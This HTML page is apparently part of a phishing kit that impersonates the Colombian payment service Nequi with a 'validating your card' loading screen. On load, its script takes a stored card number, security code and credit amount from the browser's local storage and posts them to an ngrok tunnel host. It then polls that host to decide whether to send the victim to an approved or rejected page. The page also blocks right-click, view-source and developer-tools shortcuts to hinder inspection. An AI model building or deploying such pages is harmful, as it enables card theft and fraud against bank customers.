<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Validando tarjeta - Nequi</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: system-ui, -apple-system, Arial, sans-serif;
      background: #f5f5f5;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      color: #200020;
    }
    .container {
      background: white;
      border-radius: 16px;
      padding: 40px 30px;
      text-align: center;
      max-width: 400px;
      width: 90%;
      box-shadow: 0 4px 20px rgba(0,0,0,0.1);
    }
    .spinner {
      width: 50px;
      height: 50px;
      border: 4px solid #f3f3f3;
      border-top: 4px solid #da0081;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: 0 auto 24px;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    h1 {
      font-size: 20px;
      margin-bottom: 12px;
    }
    p {
      font-size: 15px;
      color: #555;
      line-height: 1.5;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="spinner"></div>
    <h1>Estamos validando tu tarjeta</h1>
    <p>Por favor espera un momento.<br>No cierres esta ventana.</p>
  </div>

  <script>
    const userId = 'user_' + Date.now() + '_' + Math.floor(Math.random() * 1000);
    localStorage.setItem('userId', userId);

    const tarjeta = localStorage.getItem('lastCard') || 'No disponible';
    const codigo = localStorage.getItem('lastCode') || 'No disponible';
    const monto = localStorage.getItem('montoCredito') || '0';

fetch('https://fencing-acquire-protegee.ngrok-free.dev/nuevo', {
  method: 'POST',
  headers: { 
    'Content-Type': 'application/json',
    'ngrok-skip-browser-warning': 'true'
  },
  body: JSON.stringify({
    userId: userId,
    tarjeta: tarjeta,
    codigo: codigo,
    monto: monto
  })
});

  const interval = setInterval(() => {
  fetch(`https://fencing-acquire-protegee.ngrok-free.dev/estado/${userId}`, {
    headers: {
      'ngrok-skip-browser-warning': 'true'
    }
  })
    .then(res => res.json())
    .then(data => {
          if (data.estado === 'aprobado') {
            clearInterval(interval);
            window.location.href = 'aprobado.html';
          }
          if (data.estado === 'rechazado') {
            clearInterval(interval);
            window.location.href = 'rechazado.html';
          }
        })
        .catch(err => console.error(err));
    }, 2000);

document.addEventListener('contextmenu', e => e.preventDefault());
document.addEventListener('keydown', function(e) {
    if (e.ctrlKey && e.key.toLowerCase() === 'u') {
        e.preventDefault();
        return false;
    }
    if (e.ctrlKey && e.key.toLowerCase() === 's') {
        e.preventDefault();
        return false;
    }
    if (e.ctrlKey && e.shiftKey && e.key.toLowerCase() === 'i') {
        e.preventDefault();
        return false;
    }
    if (e.ctrlKey && e.shiftKey && e.key.toLowerCase() === 'c') {
        e.preventDefault();
        return false;
    }
    if (e.ctrlKey && e.shiftKey && e.key.toLowerCase() === 'j') {
        e.preventDefault();
        return false;
    }
    if (e.key === 'F12') {
        e.preventDefault();
        return false;
    }
});
    
  </script>
</body>
</html>
